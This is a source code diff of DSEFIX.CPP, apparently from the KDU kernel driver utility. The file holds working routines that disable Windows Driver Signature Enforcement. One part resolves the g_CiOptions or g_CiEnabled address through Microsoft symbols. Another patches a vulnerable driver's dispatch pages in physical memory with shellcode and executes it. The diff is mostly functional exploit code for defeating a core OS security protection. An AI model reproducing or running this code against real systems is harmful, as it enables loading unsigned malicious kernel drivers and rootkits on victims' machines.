@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2022
+*  (C) COPYRIGHT AUTHORS, 2014 - 2023
 *
 *  TITLE:       DSEFIX.CPP
 *
-*  VERSION:     1.28
+*  VERSION:     1.31
 *
-*  DATE:        01 Dec 2022
+*  DATE:        14 Apr 2023
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -297,6 +297,88 @@ NTSTATUS KDUQueryCiOptions(
 }
 
 /*
+* KDUQueryCodeIntegrityVariableSymbol
+*
+* Purpose:
+*
+* Find CI variable address from MS symbols.
+*
+*/
+ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
+    _In_ ULONG NtBuildNumber
+)
+{
+    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
+    LPWSTR lpModuleName;
+    LPCSTR lpSymbolName;
+    HMODULE mappedImageBase;
+
+    WCHAR szFullModuleName[MAX_PATH * 2];
+
+    if (NtBuildNumber < NT_WIN8_RTM) {
+        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
+        lpSymbolName = (LPCSTR)"g_CiEnabled";
+    }
+    else {
+        lpModuleName = (LPWSTR)CI_DLL;
+        lpSymbolName = (LPCSTR)"g_CiOptions";
+    }
+
+    if (symInit() == FALSE)
+        return 0;
+
+    szFullModuleName[0] = 0;
+    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
+        return 0;
+
+    _strcat(szFullModuleName, TEXT("\\"));
+    _strcat(szFullModuleName, lpModuleName);
+
+    //
+    // Preload module for pattern search.
+    //
+    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (mappedImageBase) {
+
+        printf_s("[+] Module \"%ws\" loaded for symbols lookup\r\n", lpModuleName);
+
+        imageLoadedBase = supGetNtOsBase();
+
+        if (symLoadImageSymbols(lpModuleName, (PVOID)mappedImageBase, 0)) {
+
+            if (symLookupAddressBySymbol(lpSymbolName, &kernelAddress)) {
+
+                Result = (ULONG_PTR)imageLoadedBase + kernelAddress - (ULONG_PTR)mappedImageBase;
+                supPrintfEvent(kduEventInformation, "[+] Symbol resolved to 0x%llX address\r\n", Result);
+
+            }
+            else {
+                supPrintfEvent(kduEventError, "[!] Unable to find specified symbol\r\n");
+            }
+
+        }
+        else {
+            supPrintfEvent(kduEventError, "[!] Unable to load symbols for file\r\n");
+        }
+
+        FreeLibrary(mappedImageBase);
+    }
+    else {
+
+        //
+        // Output error.
+        //
+        supPrintfEvent(kduEventError,
+            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
+            lpModuleName,
+            GetLastError());
+
+    }
+
+    return Result;
+}
+
+/*
 * KDUQueryCodeIntegrityVariableAddress
 *
 * Purpose:
@@ -391,11 +473,7 @@ ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
 
         }
         else {
-
-            supPrintfEvent(kduEventError,
-                "[!] Failed to locate kernel variable address, NTSTATUS (0x%lX)\r\n",
-                ntStatus);
-
+            supShowHardError("[!] Failed to locate kernel variable address", ntStatus);
         }
 
         FreeLibrary(mappedImageBase);
@@ -439,6 +517,7 @@ BOOL KDUControlDSE2(
     HANDLE victimDeviceHandle = NULL;
 
     KDU_PHYSMEM_ENUM_PARAMS enumParams;
+    VICTIM_IMAGE_INFORMATION vi;
 
     prov = Context->Provider;
     victimProv = Context->Victim;
@@ -462,7 +541,9 @@ BOOL KDUControlDSE2(
     //
     if (VpCreate(victimProv,
         Context->ModuleBase,
-        &victimDeviceHandle))
+        &victimDeviceHandle, 
+        NULL, 
+        NULL))
     {
         printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
     }
@@ -478,29 +559,49 @@ BOOL KDUControlDSE2(
         (PVOID)Address,
         DSEValue);
 
-    enumParams.bWrite = TRUE;
-    enumParams.ccPagesFound = 0;
-    enumParams.ccPagesModified = 0;
-    enumParams.Context = Context;
-    enumParams.pvPayload = shellBuffer;
-    enumParams.cbPayload = (ULONG)shellSize;
+    RtlSecureZeroMemory(&vi, sizeof(vi));
 
-    supPrintfEvent(kduEventInformation,
-        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);
+    if (!VpQueryInformation(
+        Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
+    {
+        supShowWin32Error("[!] Cannot query victim image information", GetLastError());
+    }
+    else {
 
-    if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {
+        enumParams.DispatchHandlerOffset = vi.DispatchOffset;
+        enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
+        enumParams.JmpAddress = vi.JumpValue;
+        enumParams.DeviceHandle = Context->DeviceHandle;
+        enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
+        enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;
 
-        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
-            enumParams.ccPagesFound,
-            enumParams.ccPagesModified);
+        enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
+        enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;
 
-        //
-        // Run shellcode.
-        //
-        VpExecutePayload(victimProv, &victimDeviceHandle);
+        enumParams.bWrite = TRUE;
+        enumParams.ccPagesFound = 0;
+        enumParams.ccPagesModified = 0;
+        enumParams.pvPayload = shellBuffer;
+        enumParams.cbPayload = (ULONG)shellSize;
 
         supPrintfEvent(kduEventInformation,
-            "[+] DSE patch executed successfully\r\n");
+            "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);
+
+        if (supEnumeratePhysicalMemory(KDUPagePatchCallback, &enumParams)) {
+
+            printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
+                enumParams.ccPagesFound,
+                enumParams.ccPagesModified);
+
+            //
+            // Run shellcode.
+            //
+            VpExecutePayload(victimProv, &victimDeviceHandle);
+
+            supPrintfEvent(kduEventInformation,
+                "[+] DSE patch executed successfully\r\n");
+        }
+
     }
 
     //
@@ -549,10 +650,7 @@ BOOL KDUControlDSE(
         sizeof(ulFlags));
 
     if (!bResult) {
-        supPrintfEvent(kduEventError,
-            "[!] Could not query DSE state, GetLastError %lu\r\n",
-            GetLastError());
-
+        supShowWin32Error("[!] Cannot query DSE state", GetLastError());
     }
     else {
 
@@ -602,16 +700,11 @@ BOOL KDUControlDSE(
 
             }
             else {
-                supPrintfEvent(kduEventError,
-                    "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
-                    dwLastError);
-
+                supShowWin32Error("[!] Cannot verify kernel memory write", dwLastError);
             }
         }
         else {
-            supPrintfEvent(kduEventError,
-                "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
-                dwLastError);
+            supShowWin32Error("[!] Error while writing to the kernel memory", dwLastError);
         }
 
     }
